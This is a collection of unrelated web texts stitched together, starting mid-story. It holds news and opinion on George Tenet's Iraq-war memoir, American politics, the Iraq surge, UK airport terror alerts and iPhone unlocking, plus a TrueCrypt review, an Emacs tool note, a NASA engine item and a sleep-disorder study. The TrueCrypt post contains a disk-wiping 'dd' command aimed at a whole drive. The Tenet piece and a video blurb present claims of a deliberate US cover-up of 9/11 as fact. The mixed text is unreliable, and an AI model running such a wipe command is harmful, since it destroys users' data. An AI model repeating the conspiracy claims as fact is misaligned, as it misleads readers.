They have
recalled every raw detail of the past few
weeks , in the hope that other teenagers
— and other parents — become better
at communicating with each other .
Rosemary 's story also serves as a
reminder that , even as parents , we can
never really know our children and that
it 's all too easy to confuse loving them
with knowing them .
David mentions a conversation last
week with a woman Rosemary used to
ride for .
She is a child psychologist and ,
David points out , did not detect any
unhappiness in his daughter .
" She made the point that our children
do n't belong to us .
They are just lent to
us , " he says .
Once again he is crying as he adds : " But we would have liked to
have had her even for a few more years . "
Ex-CIA director
Tenet admits lies told on war
By Bill Van Auken
1 May 2007
With the publication of his new memoir , At the Center of the Storm , released Monday , and in an appearance on the CBS television new program “ 60 Minutes ” the night before , former CIA director George Tenet has become the latest former official to admit publicly that the Bush administration launched its war against Iraq based upon false pretenses and manipulated intelligence .
Tenet ’s CBS interview was a display of moral cowardice and self - righteousness .
The former CIA director hailed the day - to - day work of the organization of spies , torturers and assassins that he headed for seven years , passed over the horrific death toll in the Iraq war with mild tut - tutting , and reserved his real passion for complaints about backstabbing against himself by former partners in crime like Vice President Cheney and Condoleezza Rice .
It made for a degrading spectacle , with Tenet sounding like nothing so much as third - rate Mafia hitman whining about how the big shots had sold him out after all his loyal service .
Nonetheless , the former CIA director ’s comments have an objective significance .
One of the inner circle of war conspirators has now testified publicly that the Bush administration had decided on war with Iraq from its inception , and seized on the 9/11 attacks as a pretext for the action .
“ There was never a serious debate that I know of within the administration about the imminence of the Iraqi threat , ” Tenet writes in his memoir , according to advance press reports .
Rather than discussing whether or not to invade Iraq , Tenet says , the highest circles in the Bush administration were preoccupied with how to sell the war to the American public , using the deaths of 3,000 people at the World Trade Center and the Pentagon to justify killing tens and hundreds of thousands more people in Iraq who had nothing to do with the 9/11 attacks .
The marketing strategy adopted by the administration had two components : claiming that Saddam Hussein had vast stockpiles of weapons of mass destruction , and claiming that Hussein had active , ongoing ties to Al Qaeda , to make its convoluted and preposterous argument that there was a real danger that the Iraqi leader would supply WMD for a terrorist attack on the United States .
Both legs of this construct were false , as Tenet now admits , although he claimed that only the second , the Iraq - Al Qaeda “ connection ” was deliberately fabricated .
He writes in the memoir , “ Let me say it again .
CIA found absolutely no linkage between Saddam and 9/11 . ”
As for the Saddam WMD claim , Tenet clings to the “ we were all mistaken ” mantra that the Bush administration has employed ever since its failure to find any shred of such weapons in post- invasion Iraq .
But he confirms the role of Cheney and other officials in deliberately exaggerating the WMD issue and seizing on it as a pretext for war .
Tenet ’s main complaint in his “ 60 Minutes ” interview , as well as in the book , was over the supposed distortion of his use of the words “ slam dunk ” in relation to evidence of the existence of Iraqi WMD .
The ex-CIA director admits that he used the basketball metaphor , but claims it was not an affirmation that Iraq actually had such weapons , but rather expressed his certainty that the administration could use WMD as an effective argument to stampede the American people into war .
“ We can put a better case together for a public case .
That ’s what I meant , ” Tenet told “ 60 Minutes . ”
Afterwards , the ex-CIA director complained , administration officials , including Vice President Cheney , falsely twisted his words into a supposed confirmation by the CIA that the Iraqi threat was real , and therefore going to war justified .
“ The hardest part of all this has been just listening to this for almost three years , listening to the vice president go on ‘ Meet the Press ’ on the fifth year of 9/11 and say , ‘ Well , George Tenet said slam dunk , ’ as if he needed me to say ‘ slam dunk ’ to go to war with Iraq , ” said Tenet .
Tenet claims that what was merely a passing comment on his part became turned into a main line of defense for the administration ’s decision to go to war .
He casts himself as a scapegoat , claiming that the false allegations had injured his “ reputation ” and “ personal honor . ”
Tenet refers to the December 2002 Oval Office session in which he made his “ slam dunk ” remark as “ essentially a marketing meeting . ”
This cynical language was typical of the administration in the run-up to the war of aggression against Iraq .
In September 2002 , then - White House chief of staff Andrew Card told the New York Times in relation to the war buildup , “ From a marketing point of view , you do n’t introduce new products in August . ”
Tenet writes in his book : “ I told the president that strengthening the public presentation was a ‘ slam dunk , ’ a phrase that was later taken completely out of context .
If I had simply said , ‘ I ’m sure we can do better , ’ I would n’t be writing this chapter — or maybe even this book . ”
In other words , if only he had avoided trying to impress the president with sports jargon and his name had not been bandied about on television talk shows , Tenet would presumably be enjoying his retirement .
What can one say ?
This , after playing a central role in promoting a war that has cost the lives of hundreds of thousands of Iraqis and more than 3,300 American troops .
Secretary of State Condoleezza Rice , who as former national security adviser is one of the main targets of Tenet ’s ire , appeared on talk shows Sunday morning to counter Tenet ’s charges .
She called his claim in the memoir that the administration had plans for war on Iraq pre-dating 9/11 , “ Flat out wrong . ”
Probed on the question of whether there was a debate on the “ imminence of the Iraqi threat , ” Rice responded with a reaffirmation of the administration ’s doctrine of preventive war of aggression .
Imminence , she proclaimed is not a question of “ if somebody is going to strike tomorrow . ”
Rather , she insisted , “ It ’s whether you believe you ’re in a stronger position today to deal with the threat , or whether you ’re going to be in a stronger position tomorrow . ”
Based upon this same logic , the US could launch unprovoked wars against Iran , Russia , China or any other perceived current or future enemy .
For all of his claims that he has been made a scapegoat , Tenet ’s own memoir confirms the indisputable fact that he shares major culpability for preparing the criminal war against Iraq .
He accepts blame for the National Intelligence Estimate ( NIE ) issued in 2002 , which sought to make the case for war with Iraq by deliberately exaggerating and even falsifying Iraq ’s alleged WMD capabilities .
Tenet describes the 2002 NIE as “ one of the lowest moments of my seven - year tenure , ” and expressed regrets that the document was not “ more nuanced . ”
But it was this document — far more than any “ slam dunk ” comment at the White House — that served as the foundation for the drumbeat of warnings from Bush , Cheney and Rice about the imminent threat of Iraqi attacks and even “ mushroom clouds ” if Iraq was not invaded .
It likewise was the justification given by congressional Democrats for voting for the resolution authorizing Bush to launch a war of aggression .
As for the lack of “ nuance , ” this is precisely what Tenet himself had demanded .
As USA Today reported in February 2004 , the CIA director “ pushed [ those who drafted the NIE ] to avoid wishy - washy conclusions . ”
Thrown into the document were false charges that Iraq had resumed its nuclear program , had imported aluminum tubes for uranium enrichment and was seeking “ yellowcake ” in Africa .
Tenet then had a declassified version of the NIE issued , which eliminated all dissenting views from intelligence professionals who challenged the phony charges against Iraq .
Yet , while he was director of the CIA , Tenet repeatedly went to Capitol Hill to make the Bush administration ’s fabricated case of an Iraqi - Al - Qaeda connection .
And in his book , he acknowledges that in October 2002 , at Rice ’s request , he called up a New York Times reporter covering the congressional debate on impending war to falsely claim that nothing that the CIA had learned contradicted the Bush administration ’s claims .
“ In retrospect , ” he writes .
“ I should n’t have talked to ... the reporter at Condi ’s request .
By making public comments in the middle of a contentious public debate , I gave the impression that I was a partisan player . ”
This is precisely what he was , and a valuable one at that , given both his supposedly “ above politics ” post as CIA director and his personal past as a Democrat .
In another significant statement , Tenet confirms that the administration essentially looked the other way during the summer of 2001 , when intelligence reports about impending Al Qaeda terrorist attacks within the United States should have set off alarm bells .
He describes a meeting on July 10 , 2001 at the White House , where he gave Rice a briefing in which he warned of “ multiple , spectacular attacks against the United States . ”
He said he told her : “ We believe these attacks are imminent .
Mass casualties are likely . ”
He also claims he urged preemptive strikes inside Afghanistan .
In his book , he states that Rice essentially discounted the warning , delegating it to lower - ranking functionaries .
Rice responded on CBS “ Face the Nation ” Sunday , declaring , “ Well , it ’s very interesting because that ’s not what George told the 9/11 Commission at the time .
He said that he felt that we had gotten it . ”
It is true that Tenet told a different story to the 9/11 Commission , but it is his current version that rings true .
The shift only underscores the whitewash character of the 9/11 report , which portrayed the Bush administration as giving sporadic and insufficient attention to terrorism , rather than deliberately turning its back on the probable Al Qaeda strike , in order to obtain the necessary pretext for military action .
Tenet ’s book only provides more grounds for suspicion that elements within the US government deliberately prevented the foiling of the terrorist plot , because such an attack was needed to provide a pretext for long - planned military interventions in the oil - rich Middle East and Central Asia .
One other aspect of Tenet ’s book and TV appearance has been less noted in the media , but clearly bears examination .
That is his vigorous defense of “ enhanced interrogation techniques ” — i.e. , torture — which he claimed was more effective than any other terrorism - related intelligence activities .
“ I know that this program alone is worth more than the FBI , the Central Intelligence Agency and the National Security Agency put together , have been able to tell us , ” he said on “ 60 Minutes . ”
Here is an apt yardstick for measuring the moral stature of the advocates of “ freedom ” and “ democracy ” in the White House , Pentagon , State Department and CIA .
Tenet adamantly defends the systematic use of kidnapping , illegal detention and torture — as well as systematic lying to the American people to engineer an illegal war .
His outrage is sparked only when his fellow war criminals turned on him and threw him to the wolves , in order to buy time to continue and deepen the military aggression in Iraq .
As Karl Rove exits stage right with his ruined dreams of rightist hegemony , all the political signs and portents tell us that America is turning the other way .
No doubt the departing “ boy genius ” would dispute that assertion as liberal wishful thinking , as would many on the right .
But they cannot so easily dismiss
The Economist , an avowedly conservative voice that is among the oldest and most respected periodicals in the world .
Framing the shift on the cover of its Aug. 11 issue with a question —
“ Is America turning left ? ” — the magazine ’s editors conclude in their lead essay that the answer is yes , probably .
“ Having recaptured Congress last year , the Democrats are on course to retake the presidency in 2008 , ” says the venerable British weekly , which blames the destruction of the vaunted Republican machine on the ideological excess and breathtaking incompetence of the Bush administration , as well as the sleaziness of the GOP leadership in Congress .
The editorial warns fellow conservatives against claiming that George W. Bush failed to fulfill their agenda .
The president is a lame duck but not a good scapegoat , because “ rather than betraying the right , he has given it virtually everything it craved , from humongous tax cuts to conservative judges . ”
The worst political errors of the Bush regime , from its ruinous war in Iraq to the awful Terri Schiavo intervention , sprang directly from the brilliant minds of the religious right and the neoconservatives .
“ Now the American people seem to be reacting to conservative over - reach by turning left .
More want universal health insurance ; more distrust force as a way to bring about peace ; more like greenery ; ever more dislike intolerance on social issues . ”
The magazine also presents a thorough briefing and even more gloomy analysis of the current condition of the American right , noting that conservative activists are openly angry and depressed while Republican officials privately anticipate a “ catastrophe ” next November .
The Economist ’s doomsaying is still more persuasive because its top staffers predicted only a few years ago that the Republican right would fulfill the dreams of Rove .
Back in 2004 , Economist editor John Micklethwait and Washington bureau chief Adrian Wooldridge published “ The Right Nation : Conservative Power in America , ” a best - selling book that insisted the United States is an inherently conservative country that was only growing more so under the tutelage of a powerful coalition allied with the Republican Party — and that the remnant of American liberals should simply acknowledge their status as a permanent minority relegated to irrelevance .
Right - wingers themselves , the authors predicted that the Republicans could expect a bright and boundless future thanks to favorable demographic trends , bolstered by young people who supposedly leaned right regardless of ethnicity , geography , education or profession .
Happily , neither Micklethwait nor Wooldridge has paid much for their bad bet .
Indeed , the latter is now the magazine ’s Washington bureau chief and featured columnist ; the former has been promoted to editor in chief .
They deserve to be congratulated not only for climbing the professional ladder , but for confronting the political realities that may now be somewhat embarrassing to both of them .
The Economist ’s editors — and all their once triumphal comrades — might have avoided such foolish predictions if they had paid more attention to the nuances of American politics and less to the self - serving propaganda of the Republican noise machine .
They might have noticed , for instance , that despite the outcome of the 2000 presidential election , Al Gore and Ralph Nader together decisively outperformed Bush .
Or that Republican power in the Senate owes more to the outsize clout of small states than to a true electoral majority .
Opinion surveys have provided copious evidence that contradicted the conventional wisdom about the nation ’s political outlook .
Astute analysts at Media Matters for America , a liberal watchdog group , recently released “ The Progressive Majority : Why a Conservative America Is a Myth , ” an exhaustive study of reams of polling data from nonpartisan sources that shows that American voters are not just now becoming more progressive , as 2008 approaches .
( See http://mediamatters.org/progmaj/ for the full study . )
On salient issues , despite the plurality of respondents who always identify themselves as “ conservative , ” the American people have favored progressive policies for many years .
With all due respect to The Economist , favorable attitudes toward universal health care , environmental stewardship , economic fairness and social tolerance did not suddenly arrive from nowhere this year or even last year .
Support for increasing the minimum wage , keeping abortion legal , strong environmental and consumer protections and higher taxes on the wealthy and corporations are among the most durable results in polls from one decade to the next .
Joe Conason writes for the New York Observer .
This must - see 16 minute excerpt from Barrie Zwicker 's video " The Great Conspiracy " shows that George W. Bush was acting very strangely on the morning of 9/11 .
It also touches on the " guilty demeanor " of Bush and Cheney in connection with the 9/11 Commission cover -up .
Digg it
This is what you get when you mix the five stories of Donkey Kong 's first level , a Jackass bozo and a bunch of barrels : real - life , full - sized , totally - irresistible 8 - bit arcade stupidity .
And yes , I want to play it too .

As good news continues to flow from the " surge "  some of it true , some of it false and all of it spun  it is easy to forget the bottom line .
The bottom line is whether or not we are beginning to see the re-emergence of a state in Iraq .
Three recent news stories throw some light on that question , and it is not a favorable light .
The first , by Steven Hurst of the AP , ran in the August 26 Cleveland Plain Dealer under the title , " Sectarian violence in Iraq nearly double ’ 06 level . "
Relying on the AP ’s own figures , the story reported that :
* Iraq is suffering about double the number of war - related deaths throughout the country compared with last year  an average daily toll of 33 in 2006 and 62 so far this year .
* Nearly 1,000 more people have been killed in violence across Iraq in the first eight months of this year than in all of 2006
* Baghdad has gone from representing 76 percent of all civilian and police war - related deaths in Iraq in January to 52 percent in July , bringing it back to the same spot it was roughly a year ago .
Taken together , these figures illustrate an old saying about counter - insurgency , namely that it is like trying to pick up mercury .
When counter - insurgency forces surge in one place , as we have in Baghdad , the insurgents roll someplace else .
Meanwhile , the insurgency as a whole continues to grow .
The second story , " Militias Seizing Control of Electricity Grid " by James Glanz and Stephen Farrell , ran in the August 23 New York Times .
It reports that
" Armed groups increasingly control the antiquated switching stations that channel electricity around Iraq , the electricity minister said Wednesday .
" That is dividing the national grid into fiefs that , he said , often refuse to share electricity generated locally with Baghdad and other power - starved areas in the center of Iraq
" In some cases , Mr. Wahid and other Iraqi officials say , insurgents cut power to the capital as part of their effort to topple the government .
" But the officials said it was clear that in other cases , local militias , gangs , and even some provincial military and civilian officials held on to the power simply to try to help their own areas . "
The use of the term " fiefs " is a truth - teller of some importance .
The rise of fiefdoms and the transfer of loyalty to local regions are signs of movement away from a state , not toward the re-emergence of an Iraqi state .
That has already happened in Iraq with regard to security .
The fact that it is now spreading even into distribution of electricity from what was once a national grid is not good news .
Arguably , it tells us more about the general direction of Iraq than do claims of success from the " surge . "
The third story , " Children Doing Battle in Iraq " from the August 27 Los Angeles Times , points to further long - term disorder in Iraq :
" Child fighters , once a rare presence on Iraq ’s battlefields , are playing a significant and growing role in kidnappings , killings and roadside bombings in the country , U.S. military officials say .
" Boys , some as young as 11 , now outnumber foreign fighters at U.S. detention camps in Iraq .
Since March , their numbers have risen to 800 from 100 "
The rise of child fighters will eventually make the Iraq conflict more gruesome , said Peter W. Singer , a Brookings Institution expert on child fighters .
He said militant leaders often treat children as a cheap commodity , and peace will be less attainable because " conflict entrepreneurs " now have an established and pliable fighting force in their communities .
As we have seen in Africa , when children become fighters at an early age , they provide a pool of men who for at least a generation cannot do anything but fight .
It is difficult to " de- program " them into peaceful citizens .
In turn , this leads to what we might call " supply - side war , " war driven largely by the presence of men who want to fight .
This kind of half - war , half - brigandage swarmed over Europe during the interval between the end of the Middle Ages and the rise of the state .
After Westphalia , the state put an end to it by rounding up the brigands and hanging them .
In Iraq , where the fictional state cannot even round up kilowatts , supply - side war suggests that disorder will be rampant , and a state non-existent , for quite some time .
When Congress comes back into session in September to hear General Petraeus ’s report , we may hope that it will pursue these indicators and other truth - tellers like them and not confine itself to what the general tells it .
Truth may be found more at the margins of what General Petraeus says , or in what he chooses not to address .
For once , we need Members of Congress to think like statemen , not like lawyers .

Security chiefs have downgraded the country 's terrorist threat status from " critical " to " severe " .
The Joint Terrorism Analysis Centre ( JTAC ) raised the status to its highest level on Saturday in reponse to 48 hours of terror - the blazing car packed with gas cylinders smashing into Glasgow Airport terminal and two car bombs which failed to detonate planted in the heart of London .
Five doctors , two trainee doctors and a hospital laboratory technician have been arrested and are being questioned about the terrorist attacks in London and Glasgow .
And it has emerged that as many as four of the NHS terror cell suspects were already known to security services .

Bomb scares are becoming commonplace at airports , rail and Tube networks .
The travel plans of holidaymakers and commuters have been disrupted as police responded to reports of suspect packages and suspicious behaviour at
airports , railway stations and the London Underground network .
The worst chaos was at Britain 's busiest airport terminal as thousands of summer holidaymakers were evacuated when a man was seen running from security checks .
Some passengers were forced out into the pouring rain at Heathrow 's Terminal 4 where more than 150 cancelled flights that left more than 20,000 stranded .
Travellers were surrounded by armed police carrying machine guns and herded into outside car parks as flights to the U.S. , Canada , Africa
and Asia were axed along with host short - haul flights to Europe .
There were also dramatic scenes at Victoria Station in London where a suspect car was reported .
Police , the fire brigade , sniffer dogs , paramedics and a bomb disposal team were all called to what turned out to be a false alarm .
Parts of London 's Underground were also shut down in the morning when a suspect package was discovered at Hammersmith Station .

The station , along with nearby Baron 's Court station , was shut down and a controlled explosion was carried out shortly after 9 am in the heart of the rush hour .
The night before , a Polish man caused a security - alert at Stansted Airport in Essex by leavingan unattended bag outside the terminal .
An area around the suspect luggage was cordoned off and bomb disposal experts were called in .
Similar scares threaten a summer of misery as security is stepped up across the country in the wake of the failed bomb attacks in London and Glasgow .
Lin Homer , chief executive of the Government 's new Border and Immigration Agency , said she made " no apology " for putting safety first .

She said : " We check people based on risk and not on queues .
Our objective is to secure our borders , and tougher checks on people entering the UK can mean longer queues . "
Luton and Stansted Airports have struggled to cope with the sophisticated new " biometric " passport scanners which have doubled the time it takes to process passengers arriving back into the country .
And on top of that cabin crew at Virgin Atlantic are threatening a strike over the August bank holiday in a row over pay .
BAA bosses have admitted that creaking Heathrow is held together by " sticking plaster " and " bursting at the seams " .

Yesterday 's main Heathrow alert was sparked when a passenger passing through security grabbed a bag as it emerged from the X - ray scanner and ran off .
Amid the " critical level " state of emergency British Airways cancelled all of its European flights from 3 pm , and all its long - haul flights between then and
9 pm . BA alone cancelled 108 flights in and out of its main hub terminal at Heathrow , affecting up to 20,000 passengers .
Cancellations included flights to New York , Washington , Calcutta , Cape Town , Amsterdam , Paris and Vienna .
Qantas , KLM , Kenyan Airways and Iberian were also affected , with delays and cancellations .
The number of stranded passengers rapidly built up and thousands were forced outside into the rain .
Airport operator BAA said they were in " lockdown mode " between 1 pm when the evacuation was ordered and 5 pm when Terminal 4 re-opened its doors .
It brought more chaos to the terminal , which is British Airways ' main hub , as officials warned the problems could have a knock - on effect to today .
One BA worker told the Daily Mail how the Heathrow described the incident that sparked the crisis .
He said : " A young guy had put his black case through security and some airport men went to examine it but he disappeared . "
Another airport source said : " Something was spotted by one of the Xmachines but a person picked up the bag and then scarpered .
They have police dogs searching the building . "
Last night , it was unclear what had happened to the man .
An airport worker said : " BAA should be ashamed of themselves because there were hundreds of very angry people standing outside terminal four in the rain with no food or anything and their luggage inside . "
Airport staff gave out yellow plastic rain macs , but with the wind also picking up they afforded only partial protection .
Rose Bild , 59 , from Surrey , whose flight to Toronto , Canada , should have left three hours earlier , said : " It is wet but it would be far worse if it was November or December because then it would be cold and wet . "
Since the Glasgow airport terror attack , cars have been banned from drop - off points on terminal forecourts and all passengers are now to be frisked going through security .
Controversial ethnic " profiling " is also being used to target high - risk suspects .
BAA said last night it is experiencing about four security scares a day at Heathrow in the present jittery climate .
Industry leaders fear the entire security system will grind to a halt once all schools have broken up .

Apple Inc. CEO
Steve Jobs said Tuesday that it's his company 's job to stymie hackers who try to unlock the iPhone -- the first time the company has officially said it would fight attempts to use the popular device on unauthorized networks .
At a London Apple retail store where he announced the iPhone 's Nov. 9 U.K. debut , Jobs responded to a question about whether Apple would put a stop to the unlocking hacks that have mushroomed recently .
" It 's a cat - and - mouse game , " said Jobs .
" We try to stay ahead .
People will try to break in , and it's our job to stop them breaking in . "
In last few weeks , people have unveiled several unlock hacks that let users swap the iPhone 's included SIM card with one from another cellular service provider so the phone can make calls on that carrier 's network .
With the iPhone limited to domestic sales until November , unlocking is the only way consumers living outside the U.S. have been able to use their phones .
Last week , the iPhone Dev Team posted a free unlocking hack , then followed it Monday with anySIM , an unlocking tool tucked into a graphical interface .
Just a day before the iPhone Dev Team released its free hack , a group called iPhoneSIMFree began selling an unlocking tool of its own through a network of online resellers at prices ranging from US $ 45 to $ 99 .
Carolina Milanesi , a Gartner Inc. analyst who was at the London presentation , said she wondered if it matters much in the long run whether Apple stays a step ahead of hackers , as Jobs said it must do .
" At the moment , as a consumer , you need to be very careful about unlocking the iPhone , and know how you want to use it , " she said .
" If you unlock it , you are not going to have a flat rate , and you will not have access to the 7,500 hot spots . "
O2 Ltd. , the iPhone 's sole carrier in the U.K. , will offer three flat - rate plans -- dubbed " tariffs " in Britain -- that range in price from $ 70 to $ 110 per month .
Flat - rate plans are relatively rare in the U.K. , said Milanesi .
" If you unlock and then use the Internet and e-mail , you may be surprised by your first bill , " she added , referring to the pay - as - you - go data rates charged by most carriers in the country and elsewhere in Europe .
O2 has struck a deal with a Wi -Fi provider called The Cloud that will give iPhone users unlimited wireless access to some 7,500 hot spots in Great Britain and Northern Ireland .
" There 's a difference here , too , compared to the United States , " said Milanesi .
Because Apple plans to release its iPod Touch , an iPod- cum - Internet device , in the U.K. by the end of the month , consumers will have a choice between that and the iPhone when the latter launches five weeks later .
" Now with the Touch , you have an alternative , " she said .
People who might have been drawn to the iPhone for its music capabilities , interface and / or its Web browsing features -- and might have used an unlocking hack so they could avoid paying a penalty when they ditched their current carrier -- could instead opt for the iPod Touch .
Jobs did not go into details on how Apple would bar hacks , but the process would presumably involve firmware updates to the iPhone , delivered via the iTunes software .
Both of the firmware updates issued since the iPhone 's U.S. debut in late June have either broken other , non-unlocking hacks , or forced users to restore the device from scratch .
IPhoneSIMFree , for instance , does not guarantee that its unlocking tool will work after future firmware updates .
Keeping unlocking hacks completely at bay , though , will probably be impossible , something Jobs tacitly acknowledged when he said that while it was a cat - and - mouse game between Apple and hackers , " I 'm not sure if we are the cat or the mouse . "
" Jobs said that they would stay a step ahead , " said Milanesi , " but that will be easier said than done . "
Jonny Evans and Karen Haslam of MacWorld UK contributed to this story .
This story , " Jobs Says Apple Will Fight iPhone Unlocking Hacks " was originally published by Computerworld .
A Nice Surprise
I 'm an editor for SANS ' NewsBytes security " announcements " E-zine , and have been getting really sick of the drumbeat of news items that read stuff like :
Major whatsit admits 2,000,000 user accounts exposed when employee loses laptop at airport .
Federal department of thus - and - so reports 24 million taxpayer records included with hard drive sold on ebay .
Journalist in Iraq buys US Army deployment plans on thumb drive in bazaar for $ 15 .
At TechnoSecurity conference last month there was a vendor demonstrating a very cool hydraulic - powered hard - disk mulcher , intended to make it possible for enterprises to " securely decommission " a drive and its data , without having to worry about the cost of wiping the drive .
Cost of wiping the drive ?
Huh ?!
Did n't you mean " cost of forgetting your encryption key " ?
I.e. : Zero .
And , then , to top it off , I bought a new used laptop on Ebay and the seller was kind enough to re-install Windows but not technically savvy enough to realize that XP 's installer wo n't overwrite an existing partition 's data .
So not only did she get a new laptop but we got a truly amazing collection of gay porn .
Well , I did n't look at all 7 gigabytes of it ; I was reaching for my OpenBSD boot CD before I was past the second file .
Quick !
Quick : " dd if=/dev/zero of=/dev/wd0c " -
Cost of wiping the drive ?
Anyhow , it 's 2006 and maybe it 's time to think about hard disk encryption ?
I first experimented with hard disk encryption back when I was at TIS and we were funded by DARPA to do some research in portable security ( and build a firewall ) for the White House .
At the time ( 1992 ) , there were a lot of white house staffers that were really into MacIntosh computers and laptops and there was a serious concern that some crucial data might be lost someplace .
In fact , as it happened , some Clinton big - shot apparently lost a MacIntosh at an airport - including the negotiating stop points for some trade treaty with Japan ; since this was pre-Ebay , it probably wound up in a pawn shop someplace .
But I digress .
Anyhow , Fred Avolio OK'd me buying a thing called SuperCrypt for the Mac , and another thing called Watchdog for DOS , and I spent a day or two playing with them and we made a recommendation that read , basically : " Hey , this stuff is really easy to use ; we think you should give it a whirl . "
The rest , as they say , is history .
I mean , of course , that we were completely ignored .
Stop Being Stupid ; It 's Free
I 'm not sure why I 've been so cavalier about my data since then , but to tell you the truth I 've never bothered with hard disk encryption , personally .
I think part of it was that I did n't particularly care if anyone got my data , because I like to live an open life , but it 's been slowly sinking in that there 's no sense making life easy for the bad guys .
If I can rob some phisher , hacker , or spammer of a moment 's pleasure at little cost to myself , that seems like a worthy goal .
After a few days of researching I stumbled across a thing called TrueCrypt .
It meets a lot of my requirements , namely :
Free
Uses recognizable and known encryption algorithms
Works sensibly with a container file that can be treated as external data ( i.e. : backed up to tape entire )
Source code available
No adware or " would n't you like to buy me now ? " bullshit
Small footprint
Now , it 's not as if I 'm going to go through and review the entire source code of the engine but I like the fact that it 's being developed openly and ( as far as I can tell ) is part of a project that is not socially or financially beholden to anyone .
Initial Experience
I 've been slowly migrating all of my data over to encrypted volumes ; mostly the delay is because moving the data means copying stuff back and forth across my little home LAN and reformatting / creating container files .
When you 're moving terabytes around , it takes time ; there 's no way around it .
TrueCrypt is simply a piece of cake to use .
It passed my " bozo benchmark " ( 1 ) with flying colors : I was able to start using the software without having to read any directions at all .
In fact , it has been so ridiculously easy to use that I have been wondering where the catch is .
There 's got to be one , right ?
( From the SourceFire Security Calendar )
Hard disk write speeds on my slow laptop are about 10 MB / second , which is a slight performance degradation , but acceptable .
I 'd already set my laptop up so that my personal files are on a separate volume ( C : and D : ) and all I had to do to encrypt everything was copy all of D : to one of my network servers , zap that partition , and create a container file that occupied most of the D : drive , then copy the data back .
With 18 GB of data , that took all of 1/2 hour , during which I entertained the dogs , drank some coffee , and read a book .
The hardest part of the process was getting my installation of Eudora to look for its mail archives in another directory - which took 2 seconds of looking in Eudora.ini with notepad .
Next time I wipe and reload my laptop ( about every 6 - 9 months )
I 'll just make the entire partition an encrypted volume , but for now I think I 'll leave my MP3 directory unencrypted .
If ninjas kill me and get my laptop , I hope they 're Ray Wylie Hubbard fans , too .
Creating an encrypted volume to stick all my backup images in was merely an exercise in patience : over my LAN , writing to my fileserver , it took 9 hours ( i.e. : overnight ) to format a 300 GB encrypted container file .
Secure backups appear to be something that eludes most major businesses or government agencies ; it was a problem I solved for myself while I was sound asleep .
I probably could have done my backup volume as an entire encrypted device but my file server is running a 5 year - old version of BSD and I am reluctant to mess with something that already works .
Summary
Looking at the TrueCrypt statistics for downloads I see that several thousand people are downloading it every day , and over a million have downloaded it so far .
That 's pretty impressive !!
It 's too bad the corporate muckety - mucks who are spending millions of dollars complying with paper exercise security standards like HIPAA can't be bothered to install something like that .
And it 's a shame that some corporations are going to spend millions of dollars doing damage control because of data loss , when they could have spent , ummmm , nothing , instead .
I rate TrueCrypt as five stars out of five !
Get this software .
Use it .
Sneer at the people who are so lazy that they do not encrypt their laptop drives .
Call them stupid .
And make sure you do your backups .

June 24 2006
Update : I had inadvertently used string - join , a function provided by something in my ~/.emacs.d .
The script has been updated to work with a vanilla Emacs ( 23 , but should work with 22 as well ) .
Update # 2 [ 2007.08.10 ] : Editing cheats and diffs have been implemented .
Update # 3 [ 2007.08.21 ] : I added completion to cheat.el .
The file linked on this page is still the latest version .
We all know and love cheat .
Now you can cheat without leaving Emacs ( and without using a shell in Emacs ) .
Just save cheat.el in ~/.emacs.d and then ( require ' cheat ) in your ~/.emacs .
I also bind C-z C-c to cheat , you may want to do something similar .
You can't do everything you can do with cheat on the command line yet
, and for most of the commands the cheat command itself is used .
Now you can do everything the command line client does from within Emacs , though you may need to revert to using cheat - command ( described below ) .
Here 's the rundown :
Any time you enter a cheat name there are both completion and a cheat - specific history available .
Unless you are adding a new cheat .
In that case you should use a new , unique name ( duh ) .
cheat – Lookup a cheat sheet interactively ( cheat < name > ) cheat - sheets – List all cheat sheets ( cheat sheets ) cheat - recent – List recently added cheat sheets ( cheat recent ) cheat - versions – List versions of a cheat sheet interactively ( cheat < name > -- versions ) cheat - clear - cache – Clear all cached sheets .
cheat - add - current - buffer – Add a new cheat using the specified name and the contents of the current buffer as the body .
( cheat < name > -- add ) cheat - edit – Retrieve a fresh copy of the named cheat and display the body in a buffer for editing .
cheat - save - current - buffer – Save the current cheat buffer , which should be named * cheat - < name >* .
cheat - diff –
Show the diff between the current version and the given version of the named cheat .
If the version given is of the form m:n then show the diff between versions m and n. ( cheat < name > -- diff < version > ) cheat - command – Pass any arguments you want to cheat interactively .

Here on Earth , we ’ve gotten used to the concept of a car ’s accelerator pedal .
Put it down a little , and the car accelerates slowly .
Put the “ pedal to the metal ” and you ’ll go faster .
Imagine trying to park your car when you only have two choices : off and full speed .
Developing a similar concept for a rocket is very difficult .
Most rockets are designed to go at full blast , or nothing at all .
A variable acceleration rocket would tremendously useful for landing on the Moon .
Instead of firing the landing rockets in short bursts , astronauts could throttle down for a nice smooth landing .
But building an engine like this is harder than it sounds .
NASA researchers think they ’ve got a prototype engine that should give the variable rate of acceleration astronauts are looking for .
The newly developed Common Extensible Cryogenic Engine ( CECE ) is a variant on the RL10 engine that boosted the Surveyor robot landers to the Moon back in 1966 - 68 .
The RL10 is designed to only go full throttle , so adding the variable thrust was difficult .
The main problem is that changing the throttle affects how the whole engine functions .
At low power , liquid hydrogen can slow and vapourize in the coolant lines .
This might cause the engine to stall .
During one test , the experimenters discovered that the engine “ chugged ” , vibrating 100 times a second .
It turned out oxygen vapours were forming on the injector plate , inhibiting normal flow , causing the vibrations .
It ’s not ready for space yet , but CECE might eventually become part of the design of a future lunar lander .
The astronauts returning to the Moon will be very appreciative .

Apartment Transformed into Star Trek Shrine [ Electronic House ]
If you think it ’s impossible to have sex while you sleep , think again , according to a new study .
There are at least 11 different sex- related sleep disorders , collectively referred to as “ sexsomnia ” or “ sleepsex , ” that affect people who are otherwise psychologically healthy — causing them to unknowingly engage in various sexual activities during the night .
Carlos Schenck , a psychiatrist at the Minnesota Regional Sleep Disorders Center , and his colleagues have studied a number of behavioral disorders associated with sleep .
“ Any basic instinct can come out in the context of sleep , ” Schenck told LiveScience .
“ All sorts of things can happen . ”
Recently , he and his colleagues turned their focus to sex- related sleep disorders .
They conducted computerized medical literature searches for studies published between 1950 and 2006 related to sleep and sexual behavior and looked through a number of sleep medicine textbooks .
They also analyzed data from a previously completed internet survey that had gathered data from 219 people , 92 percent of whom had experienced multiple “ sexsomnia ” episodes .
Among other things , they found that people — mostly men— sometimes masturbate , initiate sex with a partner and reach orgasm during sleep .
They usually have no memory of these activities when they wake up , learning about them only if a partner or roommate tells them .
Some of these activities can also have legal consequences , such as if someone initiates sex without a bed partner ’s consent , noted Schenck .
People are at - risk for developing sex- related sleep disorders when they also tend to suffer from other sleep disorders — such as sleepwalking or sleep terrors , according to Schenck .
“ Sexsomnia does n’t come out of nowhere , ” he said .
